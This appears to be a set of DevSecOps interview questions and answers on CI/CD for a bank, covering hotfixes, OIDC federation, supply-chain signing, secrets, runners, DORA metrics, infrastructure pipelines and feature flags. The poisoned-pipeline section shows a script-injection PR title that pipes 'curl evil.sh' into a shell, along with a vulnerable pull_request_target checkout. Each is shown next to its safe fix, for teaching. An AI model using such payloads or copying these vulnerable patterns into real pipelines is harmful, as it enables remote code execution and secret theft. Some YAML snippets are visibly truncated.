Often faster: **roll back** to the previous digest, **turn off** a feature flag, scale, or fail over. Use them before writing code under pressure.

### If a fix is needed
1. Branch from **main** (trunk-based) or from the release tag if main has moved on with unreleased changes (then fix main too).
2. Small, reviewed change (a second engineer reviews in minutes, synchronously).
3. **Same pipeline**, possibly with an expedited profile: unit, integration and critical tests run; long suites (full end-to-end, performance) may be deferred and run immediately after.
4. Deploy with the normal progressive mechanism but shorter steps.
5. Verify in production with the signals that showed the incident.

### Never skip
- Build from source control (no manual binaries).
- Code review by a second person.
- Security scanning and signing (supply-chain controls).
- The audit trail: emergency change record linked to the incident.
- Merging the fix back to main.

### After
Post-incident review, deferred tests run, emergency change ratified by the change process, and a regression test added.

~~~yaml
on:
  workflow_dispatch:
    inputs:
      incident: { required: true, type: string, description: "INC number" }

  hotfix:
    uses: bank/pipelines/.github/workflows/dotnet-service.yml@v3.4.0
    with:
      solution: Payments.sln
      image-name: payments-api
      run-integration-tests: true
      run-e2e: false                  # deferred, runs right after deploy
      canary-steps: "25,100"           # shorter progressive rollout
      change-record: "emergency:$\{{ inputs.incident }}"
  deferred-tests:
    needs: hotfix
    runs-on: ubuntu-latest
    steps:
      - run: ./run-e2e.sh --env production-synthetic
~~~

Fix on main (or release tag plus main).
Same pipeline with an expedited profile.
Never skip review, scanning, signing, audit trail.
Run deferred tests and review afterwards.

questions.q: Replace long-lived cloud credentials in pipelines with OIDC federation. How does it work, and how do you scope trust correctly?
questions.a:
### Mechanism
1. The workflow requests an **OIDC token** from GitHub ({{id-token: write}} permission). The token's claims include repository, ref, environment, workflow and job identity.
2. The cloud (Entra ID federated credential, AWS IAM OIDC provider, GCP workload identity) is configured to trust GitHub's issuer **with conditions on the subject claim**.
3. The workflow exchanges the OIDC token for a short-lived cloud access token.
No secrets stored; tokens expire in minutes.

### Scoping trust
| Subject condition | Effect |
|---|---|
| {{repo:bank/payments:environment:production}} | only jobs targeting the production environment of that repo |
| {{repo:bank/payments:ref:refs/heads/main}} | only main branch runs |
| {{repo:bank/payments:pull_request}} | PR runs (give these minimal or no rights) |
Avoid wildcards like {{repo:bank/*}}: any repo in the org could assume the role.

### Combine with
Environment protection rules (reviewers, branch restrictions), separate identities per environment, least-privilege roles (deploy to one resource group), and logging of token exchanges.

~~~yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment: production
    permissions: { id-token: write, contents: read }
    steps:

          client-id: $\{{ vars.AZURE_CLIENT_ID_PROD }}       # app registration with federated credential
          tenant-id: $\{{ vars.AZURE_TENANT_ID }}
          subscription-id: $\{{ vars.AZURE_SUBSCRIPTION_ID }}
      - run: az deployment group create -g rg-payments-prod -f infra/main.bicep
# Federated credential on the app registration:
~~~

questions.q: How could an attacker abuse your CI pipeline (poisoned pipeline execution), and how do you prevent it?
questions.a:
### Attack paths
| Attack | How |
|---|---|
| **Direct PPE** | attacker modifies the workflow file or build scripts in a PR; CI runs them with secrets |
| **Indirect PPE** | attacker modifies files the pipeline executes (Makefile, test scripts, {{package.json}} scripts, MSBuild targets) |
| **pull_request_target misuse** | runs in the base repo context with secrets; if it checks out and builds fork code, the fork's code runs with secrets |
| **Script injection** | untrusted input (PR title, branch name) interpolated into {{run:}} shell commands |
| **Compromised actions or dependencies** | tag re-pointed, typosquatted packages, post-install scripts |
| **Self-hosted runner persistence** | a malicious job leaves backdoors on a reused runner |
| **Cache poisoning** | PR job writes a poisoned cache later restored by main |

### Prevention
- PR workflows: no secrets, read-only token, no deploy rights; forks require approval to run.
- Never build untrusted code in {{pull_request_target}} or {{workflow_run}} with secrets.
- Pass untrusted inputs via environment variables, not inline expressions in shell.
- Pin actions by SHA; allow-list; dependency review.
- Ephemeral runners (one job per VM or pod).
- CODEOWNERS on {{.github/workflows}} and build scripts; branch protection.
- Separate cache scopes for PRs and main.
questions.code:
~~~yaml
# Vulnerable: PR title interpolated into a shell command
- run: echo "Title: $\{{ github.event.pull_request.title }}"      # title "x"; curl evil.sh | sh; " runs code

# Safe: pass via environment variable
- env:
    PR_TITLE: $\{{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"

# Vulnerable: pull_request_target building fork code with secrets
# on: pull_request_target
# steps:
#   - uses: actions/checkout@v4
#     with: { ref: "$\{{ github.event.pull_request.head.sha }}" }   # attacker code
#   - run: npm ci && npm test                                       # runs attacker scripts with secrets

# Safe split: untrusted build in pull_request (no secrets); privileged follow-up only handles artifacts, never executes them
~~~
pts: Direct and indirect PPE run attacker code in CI.
pull_request_target plus fork checkout is dangerous.
Script injection via untrusted inputs.
No secrets for PRs; ephemeral runners; pinned actions.
CODEOWNERS on workflows and build scripts.
questions.ex: A researcher opened a PR to a public repo whose pull_request_target workflow checked out the PR head and ran tests, exfiltrating a publishing token. The fix split workflows so untrusted code never ran with secrets, and the token was replaced with OIDC trusted publishing.

questions.q: Secure the software supply chain from commit to production: SBOMs, signing, provenance (SLSA) and admission verification. How do the pieces fit?
questions.a:
### Pieces
| Piece | What | Tooling |
|---|---|---|
| **Source integrity** | protected branches, required reviews, signed commits (optional) | GitHub rulesets |
| **Dependency hygiene** | lock files, vulnerability scanning, licence checks, private feeds with upstream proxies | Dependabot, Renovate, dependency review |
| **SBOM** | inventory of components in each artifact | Syft, CycloneDX for .NET, docker buildx SBOM |
| **Signing** | cryptographic signature on the image digest | Sigstore cosign (keyless via OIDC), Notation |
| **Provenance** | attestation of how, where and from what the artifact was built | SLSA provenance via GitHub artifact attestations or slsa-github-generator |
| **Verification at deploy** | admission controller checks signature and provenance before running | Kyverno verifyImages, Ratify, Connaisseur |
| **Runtime** | vulnerability rescans of running images; rebuild on base image CVEs | registry scanning, Trivy operator |

### SLSA levels (build track)
L1: provenance exists. L2: hosted build platform, signed provenance. L3: hardened, isolated builds where provenance can't be forged by the build steps.

### Fit
CI builds on hosted ephemeral runners, generates SBOM and provenance, signs keylessly, pushes; the cluster admits only images signed by your workflow identity with provenance from your repos.
questions.code:
~~~yaml
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions: { contents: read, packages: write, id-token: write, attestations: write }
    steps:
      - uses: actions/checkout@v4
      - uses: docker/build-push-action@v6
        id: build
        with: { push: true, tags: "ghcr.io/bank/payments-api:$\{{ github.sha }}", sbom: true, provenance: mode=max }
      - uses: actions/attest-build-provenance@v2               # SLSA provenance attestation
        with:
          subject-name: ghcr.io/bank/payments-api
          subject-digest: $\{{ steps.build.outputs.digest }}
          push-to-registry: true
      - uses: sigstore/cosign-installer@v3
      - run: cosign sign --yes ghcr.io/bank/payments-api@$\{{ steps.build.outputs.digest }}   # keyless via OIDC
# Cluster: Kyverno verifyImages requires a signature from
#   issuer https://token.actions.githubusercontent.com, subject https://github.com/bank/payments/.github/workflows/ci.yml@refs/heads/main
~~~
pts: Protect source, dependencies, build and deploy.
SBOM inventories components.
Sign digests keylessly with cosign.
SLSA provenance attests the build.
Admission controllers verify before running.
questions.ex: When a critical CVE hit a logging library, a bank with SBOMs for every image identified the 37 affected services in 10 minutes; a peer without SBOMs needed four days of manual repository searches.

questions.q: How should pipelines handle secrets? Cover storage, scoping, masking pitfalls, runtime secret delivery and rotation.
questions.a:
### Principles
1. **Prefer no secrets**: OIDC federation to clouds, managed identities for apps, trusted publishing for package registries.
2. **Secrets for apps belong at runtime**, fetched from Key Vault or Secrets Manager by the workload's identity, not injected by CI into images or manifests.
3. Pipeline secrets that remain: **environment-scoped** (production secrets only available to jobs targeting the production environment with protection rules).

### Masking pitfalls
Log masking only hides exact string matches: base64-encoded, URL-encoded, split or JSON-embedded secrets leak. Avoid printing anything derived from secrets; disable {{set -x}} around secret usage.

### Delivery to workloads
- Kubernetes: External Secrets Operator or the Secrets Store CSI driver syncing from Key Vault; or the app reads Key Vault directly via managed identity.
- Never commit encrypted secrets without a key management story (Sealed Secrets or SOPS with KMS are acceptable patterns).

### Rotation
Automated rotation (Key Vault rotation policies, dual secrets during rollover), detection of leaked secrets (secret scanning with push protection), and an incident runbook for revocation.

~~~yaml
# Runtime secrets from Key Vault via External Secrets Operator: pipeline never sees them

kind: ExternalSecret
metadata: { name: payments-db, namespace: payments }
spec:
  refreshInterval: 1h
  secretStoreRef: { kind: ClusterSecretStore, name: azure-kv-payments }   # workload identity to Key Vault
  target: { name: payments-db, creationPolicy: Owner }
  data:
  - secretKey: ConnectionStrings__Payments
    remoteRef: { key: payments-sql-connection }
---
# Pipeline: production-only secret, scoped to the environment, never echoed
# jobs.deploy-prod.environment: production
# steps: - run: ./notify.sh
#          env: { WEBHOOK_TOKEN: "$\{{ secrets.PROD_NOTIFY_TOKEN }}" }
~~~
pts: Prefer OIDC and managed identities over secrets.
App secrets fetched at runtime by workload identity.
Environment-scoped pipeline secrets.
Masking misses transformed secrets.
Automated rotation and secret scanning with push protection.
questions.ex: A pipeline printed a base64-encoded kubeconfig during debugging; masking didn't catch it and the log was visible to 200 engineers. Moving to OIDC and External Secrets removed cluster credentials and app secrets from pipelines entirely.

questions.q: You need self-hosted runners (private network access, special hardware). How do you run them securely and at scale?
questions.a:
### Risks
Persistent runners keep state between jobs: malicious or compromised jobs can plant backdoors, read caches, credentials and other jobs' workspaces. Runners inside the corporate network give attackers lateral movement.

### Secure design
| Control | Why |
|---|---|
| **Ephemeral runners**: one job per runner, destroyed after | no persistence between jobs |
| Actions Runner Controller (ARC) on Kubernetes or VM scale sets with ephemeral mode | autoscaling and ephemerality |
| **Runner groups** restricted to specific repositories and workflows | prevents any repo using production-network runners |
| Never for public repositories | anyone could run code on them |
| Network segmentation: runners can reach only what deploys need | limit blast radius |
| Minimal images, no Docker socket mounting (use rootless builders like BuildKit rootless or Kaniko) | container escape risk |
| No long-lived credentials on runners; OIDC per job | stolen credentials useless |
| Logging and monitoring of runner activity | detection |

### Scale
ARC with scale-to-zero, separate pools per workload (build vs deploy), node pools with spot instances for builds, warm pools for latency-sensitive pipelines.
questions.code:
~~~yaml
# ARC runner scale set: ephemeral pods, restricted to a runner group
apiVersion: actions.github.com/v1alpha1
kind: AutoscalingRunnerSet
metadata: { name: deploy-runners, namespace: arc-runners }
spec:
  githubConfigUrl: https://github.com/bank
  runnerGroup: production-deployers          # only allowed repos and workflows
  minRunners: 0
  maxRunners: 20
  template:
    spec:
      serviceAccountName: deploy-runner        # no cluster-admin; OIDC used for cloud access
      securityContext: { runAsNonRoot: true }
      containers:
      - name: runner
        image: ghcr.io/bank/runner-images/deploy:2026.10.1
        resources: { requests: { cpu: "1", memory: 2Gi } }
# Each job gets a fresh pod; pod deleted after the job (ephemeral by design)
~~~
pts: Persistent runners allow cross-job compromise.
Ephemeral runners via ARC or scale sets.
Runner groups restrict which repos use them.
Segment network; no Docker socket; OIDC per job.
Separate pools; scale to zero.
questions.ex: A shared persistent runner in the data centre was used by 80 repos; a compromised dependency in one test suite installed a reverse shell that waited for production deploy jobs. Moving to ephemeral ARC runners with runner groups eliminated persistence.

questions.q: How do you keep dependencies up to date across many repos without drowning teams in PRs or breaking production?
questions.a:
### Strategy
- **Automated update PRs** (Renovate or Dependabot) with grouping (all Microsoft.Extensions packages together, Angular packages together), schedules (weekly windows), and limits on open PRs.
- **Auto-merge** low-risk updates (patch and minor of well-tested packages, dev dependencies) when the pipeline is green; majors require review.
- **Security updates** prioritised and separate from routine updates, with SLAs by severity (for example critical within 72 hours).
- **Stability days**: wait a few days after a release before adopting ({{minimumReleaseAge}}) to avoid broken or malicious fresh versions.

### Prerequisites
Trustworthy tests (otherwise auto-merge is reckless), lock files, central package management to update once per repo, and monitoring after deploy.

### Org-wide view
Dashboard of dependency freshness and open vulnerabilities per service; targeted campaigns for runtime upgrades (.NET 8 to 10, Angular majors) with migration guides from the platform team.

questions.q: How do you integrate performance testing into CI/CD so regressions are caught before production without making pipelines slow?
questions.a:
### Tiers
| Tier | When | What |
|---|---|---|
| **Micro-benchmarks** (BenchmarkDotNet) | PR for hot-path code | allocations and time per operation vs baseline |
| **Performance smoke** | main, every deploy to staging | short k6 run (2 to 5 minutes) at expected load on key endpoints; thresholds on p95 and errors |
| **Load and soak** | nightly or weekly, pre-release for big changes | sustained production-like load for hours; memory leaks, connection exhaustion |
| **Stress and capacity** | quarterly or before peak seasons | find breaking points, validate autoscaling |

### Making results meaningful
- Dedicated, production-like environment (same instance sizes, data volumes); noisy shared environments produce noise.
- Compare against a **baseline** from the previous release, not absolute guesses; fail on significant regression (for example p95 up more than 15%).
- Track trends over time; store results.
- Test data realistic (account sizes, payment mixes).

### Ownership
Teams own their performance budgets (SLO-derived), platform provides the tooling and environment.

questions.q: How do consumer-driven contract tests (Pact) fit into CI/CD for microservices, and how does can-i-deploy prevent breaking deployments?
questions.a:
### Mechanism
1. **Consumer** tests run against a Pact mock provider and record interactions (request, expected response shape) into a **pact file**.
2. The pact is published to a **Pact Broker** with the consumer version and branch.
3. **Provider** verification: the provider's CI replays the pacts against the real provider (with state setup) and publishes results.
4. **can-i-deploy**: before deploying any service to an environment, ask the broker whether the version is compatible with the versions currently deployed there.
5. Record deployments to environments in the broker.

### Benefits
Catches breaking API changes without a full end-to-end environment; each team deploys independently with confidence.

### Limits and complements
- Covers the interactions consumers actually use, not full semantics.
- For events: schema registry compatibility checks or message pacts.
- Needs discipline: provider states, versioning by commit, webhooks to trigger provider verification when a pact changes.
- Not a replacement for a few end-to-end journeys.
questions.dia:
sequenceDiagram
  participant C as Consumer CI
  participant B as Pact Broker
  participant P as Provider CI
  participant D as Deploy pipeline
  C->>B: publish pact for consumer version
  B->>P: webhook: verify new pact
  P->>B: publish verification result
  D->>B: can-i-deploy consumer version to production
  B-->>D: yes, compatible with deployed provider
  D->>B: record deployment
pts: Consumers record expectations; providers verify them.
Broker stores pacts, results and deployments.
can-i-deploy gates every deployment.

Complements a few end-to-end tests.

questions.q: Define the DORA metrics precisely, explain how to measure them from pipeline and incident data, and how they can be gamed.
questions.a:
### Metrics
| Metric | Definition | Data source |
|---|---|---|
| **Deployment frequency** | how often production deployments happen per service | deploy events from pipelines or GitOps |
| **Lead time for changes** | commit (or PR merge) to running in production | commit timestamps joined with deploy events by SHA |
| **Change failure rate** | percentage of deployments causing a failure needing remediation (rollback, hotfix, incident) | deploys linked to incidents or rollbacks |
| **Failed deployment recovery time** (formerly MTTR) | time to restore service after a failed deployment | incident start and resolution |
DORA also tracks **reliability** against SLOs and, more recently, rework rate.

### Measuring
Emit structured deploy events (service, SHA, environment, time, outcome), link incidents to deploy SHAs, and compute per service and team. Use medians and distributions, not just averages.

### Gaming and misuse
- Splitting deployments artificially to raise frequency.
- Not linking incidents to deploys to lower change failure rate.
- Using metrics to rank teams creates fear and gaming; use them for **team self-improvement** and to find systemic bottlenecks (approvals, flaky tests, environment waits).
questions.code:
~~~sql
-- Lead time for changes per service (median, last 30 days)
WITH changes AS (
    SELECT d.Service, c.Sha, c.CommittedAt, d.DeployedAt
    FROM delivery.Deployments d
    JOIN delivery.DeploymentCommits dc ON dc.DeploymentId = d.Id
    JOIN delivery.Commits c ON c.Sha = dc.Sha
    WHERE d.Environment = 'production' AND d.Outcome = 'succeeded' AND d.DeployedAt >= DATEADD(day, -30, SYSUTCDATETIME())
)
SELECT DISTINCT Service,
       PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY DATEDIFF(minute, CommittedAt, DeployedAt)) OVER (PARTITION BY Service) AS MedianLeadTimeMinutes
FROM changes;

-- Change failure rate: deployments linked to an incident or followed by rollback within 24h
SELECT Service, 100.0 * SUM(CASE WHEN CausedIncident = 1 OR RolledBack = 1 THEN 1 ELSE 0 END) / COUNT(*) AS ChangeFailurePct
FROM delivery.Deployments WHERE Environment = 'production' AND DeployedAt >= DATEADD(day, -30, SYSUTCDATETIME())
GROUP BY Service;
~~~
pts: Deployment frequency, lead time, change failure rate, recovery time.
Measure from deploy events linked to commits and incidents.
Medians and distributions per service.
Metrics are easily gamed when used to rank teams.
Use them to find systemic bottlenecks.
questions.ex: Measured lead time showed 80% of a bank's 6-day lead time was waiting for manual approval and a shared staging environment. Fixing those two bottlenecks moved lead time to under one day without any team working harder.

questions.q: The main pipeline takes 45 minutes and developers batch changes to avoid it. Take it to under 10 minutes. Where do you look and what do you change?
questions.a:
### Measure first
Break down time per job and step over the last 100 runs (queue time, setup, restore, build, test, packaging, deploy waits). Optimise the critical path, not everything.

### Typical wins
| Area | Change | Typical saving |
|---|---|---|
| Queue time | more runners, autoscaling, larger runners for heavy jobs | minutes |
| Restore | lock-file keyed caches; local package proxy | 1 to 3 min |
| Build | build once, reuse outputs across jobs via artifacts; incremental builds in monorepos | 2 to 5 min |
| Tests | parallel shards, Testcontainers reuse, test impact analysis on PRs, move slow e2e to post-merge | 10 to 20 min |
| Docker | BuildKit cache, multi-stage with restore layer, smaller base images | 2 to 5 min |
| Sequential jobs | run independent jobs in parallel (scan, test, package) | varies |
| Waiting on environments | ephemeral environments instead of shared staging queues | large |
| Flaky reruns | fix flakes: reruns double effective time | large |

### Keep it fast
A pipeline time budget (for example PR under 10 minutes, main to staging under 20) tracked on a dashboard, with an owner, and regressions treated like performance bugs.
questions.code:
~~~yaml
# Before: one long sequential job. After: cheap gate, then parallel jobs sharing the build output
jobs:
  build:
    runs-on: ubuntu-latest-8-cores
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with: { dotnet-version: 9.0.x, cache: true, cache-dependency-path: "**/packages.lock.json" }
      - run: dotnet build -c Release --locked-mode -warnaserror
      - uses: actions/upload-artifact@v4
        with: { name: build-output, path: "**/bin/Release/**", retention-days: 1 }
  unit:
    needs: build
    runs-on: ubuntu-latest
    steps: [ { uses: actions/checkout@v4 }, { uses: actions/download-artifact@v4, with: { name: build-output } }, { run: dotnet test tests/Unit --no-build -c Release } ]
  integration:
    needs: build
    strategy: { matrix: { shard: [1, 2, 3, 4] } }
    runs-on: ubuntu-latest
    steps: [ { uses: actions/checkout@v4 }, { uses: actions/download-artifact@v4, with: { name: build-output } }, { run: "./run-shard.sh $\{{ matrix.shard }} 4" } ]
  image:
    needs: build
    runs-on: ubuntu-latest
    steps: [ { uses: actions/checkout@v4 }, { run: docker buildx build --cache-from type=gha --cache-to type=gha,mode=max . } ]
~~~
pts: Measure per-step time; optimise the critical path.
Caches, parallel jobs, sharding, build once.
Move slow end-to-end tests post-merge.
Ephemeral environments instead of shared queues.
Set and track a pipeline time budget.

questions.q: Auditors demand segregation of duties and change approval. How do you satisfy them while keeping continuous delivery?
questions.a:
### What auditors actually need
Evidence that (1) changes are authorised, (2) the person who wrote a change is not the only person who approved it, (3) what was tested is what was deployed, (4) production access is controlled, (5) emergency changes are reviewed after the fact.

### Automated controls that satisfy them
| Control objective | Pipeline implementation |
|---|---|
| Authorised change | PR with required approval from someone other than the author (branch protection, CODEOWNERS) |
| Segregation of duties | author cannot approve own PR; deploys run by the pipeline identity, not humans; production environment requires a different approver for high-risk changes |
| Tested artifact deployed | build once, sign, deploy by digest, provenance attestation |
| Controlled production access | no standing human access; just-in-time elevation with approval and logging |
| Traceability | change record auto-created from PR, linked to ticket, tests, deploy and digest |
| Emergency changes | expedited path still requires review; post-implementation review within 48 hours |

### Replacing the CAB
Move from a weekly change advisory board to **risk-based automated approval**: standard changes (most) pre-approved via controls; high-risk changes get human review with full context. Show auditors the evidence trail; most accept it.

~~~yaml
  artifact:
    image: ghcr.io/bank/payments-api@sha256:7d2f...
    provenance: verified

  deployment:
    executed_by: github-actions[payments/ci.yml]     # no human hands on production
    environment: production
    started: 2026-10-13T10:42:11Z
    canary_analysis: passed
  links: { ticket: PAY-2231, incident: null }
~~~

Branch protection and different approvers give SoD.

questions.q: Design the pipeline for infrastructure as code (Terraform or Bicep): plan review, apply, state, drift and blast-radius control.
questions.a:
### Pipeline
1. PR: format, validate, lint (tflint), policy checks (OPA conftest, Checkov), **plan** posted to the PR for review.
2. Merge: apply the **exact reviewed plan** (saved plan artifact) to non-production, then production with approval for destructive changes.
3. Post-apply: drift detection on a schedule ({{terraform plan -detailed-exitcode}}), alert on drift.

### State
Remote backend (Azure Storage with locking, S3 with DynamoDB lock or native locking), encrypted, access restricted to the pipeline identity; never local state.

### Blast radius
- Split state by component and environment (network, data, apps), not one giant state.
- Prevent destroy of critical resources ({{prevent_destroy}}, resource locks).
- Policy gate: plans containing deletes of databases or key vaults require extra approval.
- Separate identities per environment with least privilege.

### Bicep specifics
What-if for preview, deployment stacks with deny settings, and Azure Policy as guardrails.
questions.code:
~~~yaml
jobs:
  plan:
    runs-on: ubuntu-latest
    permissions: { id-token: write, contents: read, pull-requests: write }
    steps:
      - uses: actions/checkout@v4
      - uses: hashicorp/setup-terraform@v3
      - run: terraform -chdir=envs/prod/payments init -backend-config=backend.hcl
      - run: terraform -chdir=envs/prod/payments plan -out=tfplan -lock-timeout=5m
      - run: terraform -chdir=envs/prod/payments show -json tfplan > plan.json
      - name: Policy check (deny deletes of protected resources)
        run: conftest test plan.json -p policy/terraform
      - uses: actions/upload-artifact@v4
        with: { name: tfplan-prod-payments, path: envs/prod/payments/tfplan }
  apply:
    needs: plan
    if: github.ref == 'refs/heads/main'
    environment: production-infra
    runs-on: ubuntu-latest
    permissions: { id-token: write, contents: read }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with: { name: tfplan-prod-payments, path: envs/prod/payments }
      - run: terraform -chdir=envs/prod/payments init -backend-config=backend.hcl && terraform -chdir=envs/prod/payments apply tfplan
~~~
pts: Plan in PR, apply the exact saved plan.
Remote locked encrypted state; pipeline-only access.
Split state to limit blast radius.
Policy gates on destructive changes.
Scheduled drift detection.
questions.ex: A Terraform apply from a laptop with a stale branch deleted a production DNS zone. After moving to pipeline-only applies of reviewed plans with conftest blocking deletes of protected resources, the same mistake would have been blocked at PR time.

Terraform vs Bicep for Azure?
How do you test infrastructure modules?

questions.q: Not everything can deploy continuously: mobile apps, on-premise installs, partner-certified APIs. How do you design release trains and still keep trunk-based development?
questions.a:
### Release train
A fixed cadence (for example every two weeks): cut a **release branch from main** at a fixed time, stabilise (only fixes, cherry-picked from main), release, tag. Main keeps moving.

### Mobile specifics
- Store review delays and users who don't update: **server-driven** behaviour and feature flags for remote enable/disable.
- Staged rollouts (Play Console percentage rollout, App Store phased release).
- Minimum supported version enforcement via an API (force update for security).
- Backward-compatible APIs for N previous app versions; contract tests with the oldest supported version.
- Crash and ANR monitoring gates the staged rollout.

### On-premise and certified releases
Multiple supported versions: release branches per version with backports; long-term support policy; signed installers with SBOMs.

### Pipeline
Same build and test pipeline; release branches trigger release packaging (store upload, installer signing); fixes always land on main first, then cherry-picked.
questions.code:
~~~yaml
# Release train: cut release branch every other Monday, build store artifacts from it
on:
  schedule: [{ cron: "0 6 * * 1" }]
  workflow_dispatch:
jobs:
  cut:
    runs-on: ubuntu-latest
    if: $\{{ github.event_name == 'workflow_dispatch' || (github.run_number % 2 == 0) }}
    permissions: { contents: write }
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - run: |
          VERSION=$(date +%Y.%m.%d)
          git checkout -b release/$VERSION origin/main
          git push origin release/$VERSION
# Separate workflow on push to release/** builds signed AAB/IPA, uploads to stores with 5 percent staged rollout
~~~
pts: Release branches cut from main on a cadence.
Fixes land on main first, then cherry-picked.
Mobile: flags, staged rollouts, minimum versions, backward-compatible APIs.
LTS branches for on-premise versions.
Same pipeline; release-specific packaging.
questions.ex: A banking app's long-lived develop branch made each store release a two-week merge marathon. Trunk-based development with a bi-weekly release branch, remote feature flags and 5% staged rollouts cut release preparation to a day and enabled pausing bad rollouts.

How long do you support old app versions?
How do you force upgrades safely?
pit: Fixes made only on release branches.
Breaking APIs for old app versions.
No remote kill switches in mobile apps.

questions.q: Feature flags enable continuous deployment but accumulate as debt. Design the flag lifecycle, types and governance.
questions.a:
### Flag types (different lifetimes)
| Type | Purpose | Lifetime |
|---|---|---|
| **Release toggle** | hide incomplete work, progressive exposure | days to weeks; remove after full rollout |
| **Experiment** | A/B tests | weeks |
| **Ops toggle / kill switch** | disable expensive or risky features in incidents | long-lived, documented |
| **Permission / entitlement** | features per plan or customer | long-lived (really configuration) |

### Lifecycle
1. Create with **owner, type, expiry date, ticket**.
2. Default off in production; enabled progressively.
3. At full rollout, a removal ticket is due; CI warns when flags pass expiry.
4. Remove code paths and the flag definition together.

### Governance
- Limit the number of active release flags per service.
- Test both states of a flag in CI for critical paths.
- Audit trail of flag changes (who, when, why); flag changes in production are changes like deploys.
- Don't nest flags deeply; keep evaluation at boundaries.

### Tooling
Azure App Configuration feature management, LaunchDarkly, Unleash, OpenFeature as a vendor-neutral API.
pts: Release, experiment, ops and permission flags have different lifetimes.
Every flag has owner, type, expiry, ticket.
CI warns or fails on expired release flags.
Test both states for critical paths.
Audit flag changes like deploys.
questions.ex: A service accumulated 140 flags, 90 permanently on; a cleanup accidentally flipped an old flag and re-enabled a deprecated fee calculation for a day. Flag metadata with expiry and a CI check kept active release flags under 10 per service afterwards.
fu: How do flags interact with caching?
Where should flags be evaluated?
How do you test flag combinations?

questions.q: Design a "golden path" CI/CD platform for 100 teams. What does the platform provide, how is it adopted, and how do you measure success?
questions.a:
### Platform offering
- **Archetype templates**: .NET service, Angular/React app, library, worker, infrastructure module, each with reusable pipelines (build, test, scan, SBOM, sign, provenance, deploy).
- **Deployment platform**: GitOps (Argo CD) with progressive delivery (Argo Rollouts) and standard analysis templates.
- **Runners**: ephemeral, autoscaled, with caching.
- **Security built in**: OIDC, secret scanning, dependency review, signing, admission verification.
- **Self-service**: a portal (Backstage) to scaffold a service with repo, pipelines, environments, dashboards and alerts in minutes.
- **Evidence**: auto-generated change records and DORA metrics.

### Adoption
Make the golden path the easiest path (faster than DIY), not mandatory on day one; migrate early adopters, publish wins, then set a deadline for mandatory controls (signing, scanning) while leaving flexibility elsewhere. Inner-source contributions to templates.

### Measure
Time to first production deploy for a new service, pipeline time, adoption percentage, DORA metrics trends, security control coverage, developer satisfaction (survey).
questions.code:
~~~yaml
# Backstage software template (excerpt): scaffold a service on the golden path
apiVersion: scaffolder.backstage.io/v1beta3
kind: Template
metadata: { name: dotnet-service, title: ".NET service (golden path)" }
spec:
  parameters:
    - title: Service
      required: [name, owner, domain]
      properties:
        name: { type: string, pattern: "^[a-z][a-z0-9-]+$" }
        owner: { type: string, ui:field: OwnerPicker }
        domain: { type: string, enum: [payments, lending, cards, customer] }
  steps:
    - id: fetch

~~~
pts: Archetype templates with security built in.
GitOps, progressive delivery, ephemeral runners.
Self-service scaffolding through a portal.
Adoption by being easiest, then mandatory controls with deadlines.
Measure time to first deploy, DORA, coverage, satisfaction.
questions.ex: Before the golden path, a new service took 6 weeks to reach production (tickets for repos, pipelines, environments). With Backstage templates and GitOps registration, it took 1 day, and 85% of teams adopted voluntarily within a year.

Who funds the platform?
